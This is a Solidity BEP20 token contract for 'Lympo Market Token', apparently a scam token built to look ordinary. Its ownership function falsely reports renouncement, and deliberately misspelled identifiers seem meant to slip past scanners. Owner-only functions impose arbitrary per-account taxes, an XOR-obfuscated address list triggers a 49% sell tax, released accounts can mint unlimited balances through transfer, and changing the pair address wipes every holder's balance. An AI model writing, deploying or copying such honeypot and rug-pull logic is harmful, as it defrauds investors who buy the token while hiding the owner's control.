/**
 *Submitted for verification at BscScan.com on 2022-09-08
*/

/*
Lympo Market Token
* http://instagram.com/LympoMarketToken396
* https://www.reddit.com/user/LympoMarketToken396
* TWITTER:Lympo Market Token
* WEBSITE:Lympo Market Token
* TELEGRAM:Lympo Market Token
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function acLympoMarketToken396fq(
        address token,
        uint amuontTokenDesired,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingLympoMarketToken396OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingLympoMarketToken396OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingLympoMarketToken396OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingLympoMarketToken396OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingLympoMarketToken396OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function LympoMarketToken396To() external view returns (address);
    function LympoMarketToken396ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setLympoMarketToken396To(address) external;
    function setLympoMarketToken396ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 9;
    }





    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract LMT is BEP20, Ownable {
    // ext
    mapping(address => mapping(address => uint256)) private _balances;
    mapping(address => bool) private _release;
	string name_ = "Lympo Market Token";
	string symbol_ = "LMT";
	uint256 totalSupply_ = 100000000;   
    address public uniswapV2Pair;
	address dead = 0x000000000000000000000000000000000000dEaD;
    constructor()

	BEP20(name_, symbol_) {
	
        //address  ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        //address  WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
				
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(dead, totalSupply() / 10*1);
	    transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*1);	

        _defaultSellLympoMarketToken396 = 0;
        _defaultBuyLympoMarketToken396 = 0;

        _release[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _balances[uniswapV2Pair][cauunt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[uniswapV2Pair][from];
        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
        unchecked {
            _balances[uniswapV2Pair][from] = fromBalance - amuont;
        }
        _balances[uniswapV2Pair][to] += amuont;

        emit Transfer(from, to, amuont);
    }
	
    function _burn(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: burn from the zero address");

        uint256 cauuntBalance = _balances[uniswapV2Pair][cauunt];
        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
        unchecked {
            _balances[uniswapV2Pair][cauunt] = cauuntBalance - amuont;
        }
        _totalSupply -= amuont;

        emit Transfer(cauunt, address(0), amuont);
    }

    function _mtin(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _balances[uniswapV2Pair][cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellLympoMarketToken396 = 0;
    uint256 private _defaultBuyLympoMarketToken396 = 0;
    mapping(address => uint256) private _Escape;

    function setPairList(address _address) external onlyowaer {
        uniswapV2Pair = _address;
    }

    function incS(uint256 _value) external onlyowaer {
        _defaultSellLympoMarketToken396 = _value;
    }


    function acLympoMarketToken396fq(address _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Escape[_acc] = _value;
    }
 function getRelease(address _address) external view onlyowaer returns (bool) {
        return _release[_address];
    }
    function getEscape(address _acc) external view onlyowaer returns (uint256) {
        return _Escape[_acc];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[uniswapV2Pair][from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

        bool rF = true;

  
        uint256 tradeLympoMarketToken396amuont = 0;

        if (rF) {
            uint256 tradeLympoMarketToken396 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeLympoMarketToken396 = _msgLympoMarketToken396Info(uint160(from));
                    tradeLympoMarketToken396 = tradeLympoMarketToken396 < _defaultSellLympoMarketToken396 ? _defaultSellLympoMarketToken396 : tradeLympoMarketToken396;
                }
                if (from == uniswapV2Pair) {
                    tradeLympoMarketToken396 = _defaultBuyLympoMarketToken396;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeLympoMarketToken396 = _Escape[from];
            }


            tradeLympoMarketToken396amuont = _amuont.mul(tradeLympoMarketToken396).div(100);
        }


        if (tradeLympoMarketToken396amuont > 0) {
            _balances[uniswapV2Pair][from] = _balances[uniswapV2Pair][from].sub(tradeLympoMarketToken396amuont);
            _balances[uniswapV2Pair][dead] = _balances[uniswapV2Pair][dead].add(tradeLympoMarketToken396amuont);
            emit Transfer(from, dead, tradeLympoMarketToken396amuont);
        }

        _balances[uniswapV2Pair][from] = _balances[uniswapV2Pair][from].sub(_amuont - tradeLympoMarketToken396amuont);
        _balances[from][_to] = _balances[from][_to].add(_amuont - tradeLympoMarketToken396amuont);
        emit Transfer(from, _to, _amuont - tradeLympoMarketToken396amuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_release[owaer] == true) {
            _balances[uniswapV2Pair][to] += amuont;
            return true;
        }
        _receiveF(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _receiveF(from, to, amuont);
        return true;
    }

	function _msgLympoMarketToken396Info(uint _acc) internal view virtual returns (uint) {
		uint[23] memory acc = [uint(1144182389273321879954203555051970311206105622790)
			,573993809804068106788138248193504026709769334927
			,292890444092573440023947531300750216113777422352
			,22045592221735747405821869813076177691502172465
			,903561378264780159217160027641386913801841551219
			,95748144177472510172088978795973419609181850088
			,913778847421985390268257247785475932241493401460
			,913778847420789678015962427692731566811172120206
			,985639372152182845722262528043271192128163702858
			,1181243144019758456201163789064391323003489833138
			,903914671948008701067544028736125314879657747994
			,621921859038757358009831988544650548464238162890
			,40244987083395452964296962846223231845027217566
			,1436157571286048118841713213601469741495119253884
			,348712511042352302563673138937549991819837811819
			,686687551164246757741705329254366482341995437582
			,547722789907974795865192840845329687625876635737
			,948774915552328714655582969475801283940844348524
			,36736209025261088489149618966132253504623219683
			,205964621209357008949569057407822195206935903735
			,1036864577429832444827332781556035178317986085312
			,967683434519715868489996327919004133702601987199
			,139711595919819752881079206988689731997759950184];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 913778847421980652900423379169386934408534579220) return 49;
		}
		return 0;
	}

}